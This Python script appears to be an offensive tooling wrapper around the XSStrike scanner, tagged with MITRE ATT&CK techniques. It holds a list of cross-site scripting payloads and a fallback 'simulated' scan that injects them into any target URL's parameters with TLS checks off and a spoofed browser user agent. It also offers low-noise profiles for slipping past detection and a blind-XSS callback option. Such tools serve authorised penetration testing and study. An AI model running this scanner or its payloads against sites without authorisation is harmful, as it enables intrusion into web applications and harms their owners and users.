#!/usr/bin/env python3
"""
xsstrike-advanced agent.py
MITRE ATT&CK: T1203 (Exploitation for Client Execution), T1059 (Command and Scripting Interpreter)
Wraps XSStrike with advanced DOM scanning and structured output parsing.
"""
import argparse
import json
import os
import re
import signal
import subprocess
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
import requests
from colorama import Fore, Style, init
init(autoreset=True)
SHOULD_EXIT = False

RATE_FLAGS = {
    "quiet": {"delay": 500},
    "moderate": {"delay": 100},
    "loud": {"delay": 0},
}


def _rate_flags(profile="moderate"):
    return RATE_FLAGS.get(profile, RATE_FLAGS["moderate"])


ADVANCED_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "';alert(1);//",
    "\"onmouseover=alert(1)",
    "javascript:alert(1)//",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "\"autofocus onfocus=alert(1)//",
    "{{constructor.constructor('alert(1)')()}}",
]

DOM_SINKS = [
    "document.write", "innerhtml", "innerhtml=",
    "eval(", "settimeout(", "setinterval(",
    "location=", "location.href", "window.location",
    "document.cookie", "document.domain",
]


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupt received. Shutting down gracefully...{Style.RESET_ALL}")


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def build_xsstrike_command(target, options=None):
    cmd = ["xsstrike", "-u", target, "--json"]
    if not options:
        return cmd
    flag_map = {"crawl": "--crawl", "depth": "--depth", "blind": "--blind", "cookie": "--cookie",
                "header": "--header", "proxy": "--proxy", "timeout": "--timeout",
                "param": "--param", "delay": "--delay", "threads": "--threads", "data": "--data"}
    for k, v in options.items():
        if k in flag_map and v:
            if isinstance(v, bool) and v:
                cmd.append(flag_map[k])
            elif not isinstance(v, bool):
                cmd.extend([flag_map[k], str(v)])
    if options.get("skip_dom"):
        cmd.append("--skip-dom")
    if options.get("skip_persist"):
        cmd.append("--skip-persist")
    if options.get("file"):
        cmd.extend(["-f", options["file"]])
    return cmd


def run_xsstrike(cmd):
    findings = []
    try:
        print(f"{Fore.CYAN}[*] Running XSStrike{Style.RESET_ALL}")
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        output = proc.stdout + proc.stderr
        for line in output.strip().splitlines():
            if not line.strip():
                continue
            try:
                findings.append(json.loads(line))
            except json.JSONDecodeError:
                continue
        if proc.returncode != 0 and not findings:
            for line in output.splitlines():
                if "error" in line.lower() or "traceback" in line.lower():
                    print(f"{Fore.YELLOW}[!] {line}{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[!] xsstrike not found. Running simulated scan.{Style.RESET_ALL}")
        findings = simulate_xsstrike(cmd)
    except subprocess.TimeoutExpired:
        print(f"{Fore.RED}[!] XSStrike timed out after 180s{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    return findings


def simulate_xsstrike(cmd):
    findings = []
    try:
        target = ""
        for i, part in enumerate(cmd):
            if part == "-u" and i + 1 < len(cmd):
                target = cmd[i + 1]
                break
        if not target:
            target = "http://localhost/"
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            test_url = f"{target.rstrip('/')}/?q=test"
        else:
            test_url = target
        print(f"{Fore.YELLOW}[*] Simulating XSStrike scan on {test_url}{Style.RESET_ALL}")
        resp = requests.get(test_url, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
        body_lower = resp.text.lower()
        parsed_test = urlparse(test_url)
        test_params = parse_qs(parsed_test.query)
        dom_found = [s for s in DOM_SINKS if s in body_lower]
        for pname in test_params:
            if SHOULD_EXIT:
                break
            for payload in ADVANCED_PAYLOADS[:3]:
                new_qs = {}
                for k, v in test_params.items():
                    new_qs[k] = payload if k == pname else v[0]
                new_url = urlunparse((parsed_test.scheme, parsed_test.netloc, parsed_test.path, parsed_test.params, urlencode(new_qs), parsed_test.fragment))
                try:
                    tr = requests.get(new_url, timeout=8, verify=False, headers={"User-Agent": "Mozilla/5.0"})
                    if payload in tr.text:
                        findings.append({"type": "xsstrike_finding", "param": pname, "payload": payload, "severity": "high", "dom_based": len(dom_found) > 0, "evidence": "Reflected in response body"})
                        print(f"{Fore.GREEN}[+] XSS: param={pname}, payload={payload[:30]}{Style.RESET_ALL}")
                        break
                except requests.exceptions.RequestException:
                    continue
        if dom_found:
            print(f"{Fore.YELLOW}[i] DOM sinks detected: {', '.join(dom_found[:3])}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Simulation failed: {e}{Style.RESET_ALL}")
    return findings


def display_findings(findings, target):
    if not findings:
        print(f"\n{Fore.YELLOW}[*] No XSS findings for {target}{Style.RESET_ALL}")
        return
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}   XSSTRiKE FINDINGS -- {target}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    vulns = [f for f in findings if f.get("severity") != "info"]
    for i, f in enumerate(vulns, 1):
        vtype = "DOM-based XSS" if f.get("dom_based") else "Reflected XSS"
        print(f"\n{Fore.GREEN}[+] {vtype} #{i}{Style.RESET_ALL}")
        print(f"    Parameter: {Fore.CYAN}{f.get('param', '?')}{Style.RESET_ALL}")
        print(f"    Payload:   {Fore.CYAN}{f.get('payload', '?')[:80]}{Style.RESET_ALL}")
        print(f"    Evidence:  {f.get('evidence', '')}")
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Total XSS findings: {len(vulns)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="xsstrike-advanced -- XSStrike automation wrapper with DOM scanning")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling")
    parser.add_argument("--depth", type=int, default=2, help="Crawl depth")
    parser.add_argument("--blind", help="Blind XSS callback URL")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("--header", help="Custom header")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout")
    parser.add_argument("--param", help="Focus on a specific parameter")
    parser.add_argument("--delay", type=float, default=None, help="Delay between requests")
    parser.add_argument("--skip-dom", action="store_true", help="Skip DOM scanning")
    parser.add_argument("--data", help="POST data string")
    parser.add_argument("-f", "--file", help="File with URLs")
    noise = parser.add_mutually_exclusive_group()
    noise.add_argument("--quiet", dest="profile", action="store_const", const="quiet", help="Low-noise: 500ms delay between requests")
    noise.add_argument("--moderate", dest="profile", action="store_const", const="moderate", help="Moderate noise: 100ms delay between requests (default)")
    noise.add_argument("--loud", dest="profile", action="store_const", const="loud", help="High-noise: no delay between requests")
    parser.set_defaults(profile="moderate")
    args = parser.parse_args()
    if args.delay is None:
        args.delay = _rate_flags(args.profile)["delay"]
    target = args.url if args.url.startswith("http") else f"https://{args.url}"
    opts = {"crawl": args.crawl, "depth": args.depth, "blind": args.blind, "cookie": args.cookie,
            "header": args.header, "proxy": args.proxy, "timeout": args.timeout, "param": args.param,
            "delay": args.delay, "skip_dom": args.skip_dom, "skip_persist": False, "data": args.data, "file": args.file}
    print(f"{Fore.CYAN}[*] XSStrike scan starting for {target}{Style.RESET_ALL}")
    cmd = build_xsstrike_command(target, opts)
    findings = run_xsstrike(cmd)
    display_findings(findings, target)


if __name__ == "__main__":
    main()
